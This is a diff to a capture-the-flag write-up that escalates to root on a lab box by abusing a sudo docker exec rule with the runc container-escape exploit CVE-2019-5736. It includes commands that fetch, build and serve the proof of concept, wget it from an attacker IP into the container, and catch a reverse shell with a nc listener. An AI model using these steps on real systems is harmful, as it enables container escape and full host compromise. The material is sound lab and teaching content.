@@ -193,12 +193,57 @@ Looking at "sudo -l" shows something intresting!
 
 ![image](https://user-images.githubusercontent.com/5285547/127515744-fcfcd06d-c6da-4513-b21d-a23349c61d3f.png)
 
-Looks like a docker escape or path/command abuse based on the wildcard "\*" after webapp-dev01
+Looks like a docker escape or abuse in some way. Time for some research!
+
+Docker version
+
+![image](https://user-images.githubusercontent.com/5285547/127520414-391a0880-b237-45a0-8101-a7ed1736253b.png)
+
+I looked the version up online and came across this poc for   
+the exploit: https://github.com/Frichetten/CVE-2019-5736-PoC
+
+Time to try it out. 
+
+Setup. 
+Have 2 ssh instances on the target machine for ease
+
+```
+wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go
+nano main.go                            # Change the payload to what you want here. 
+go build main.go
+python3 -m http.server                  # host and serve the file to the target box. 
+```
+
+Change payload: 
+
+![image](https://user-images.githubusercontent.com/5285547/127521487-5f6c01ef-3a93-4859-a4b4-3a2d15be3674.png)
+
+Now host it then open the container on the attacking box. 
+
+```
+sudo /usr/bin/docker exec -it webapp-dev01 sh
+```
+
+Run the next commands to transfer the exploit to the target and get ready to run  
+the next commands when you see the Success message. 
+
+In container (attack box)
+
+```
+wget http://10.10.14.87:8088/main && chmod +x main
+```
+
+On another ssh connection, have this command ready. Plus a nc listner on port 9999
+
+```
+sudo docker exec -it webapp-dev01 /bin/sh
+```
+
+Now execute the command below, wait for the success message and then run the command on the other ssh session. 
+
+Then catch the reverse shell from the cotainer on your machine to get root! 
+
+![image](https://user-images.githubusercontent.com/5285547/127523183-07b4c79b-a0f0-4c32-9c8c-85fdd1890616.png)
 
 
-
-
-
-
-
-
+I really enjoyed this box, I hope you did too!! 
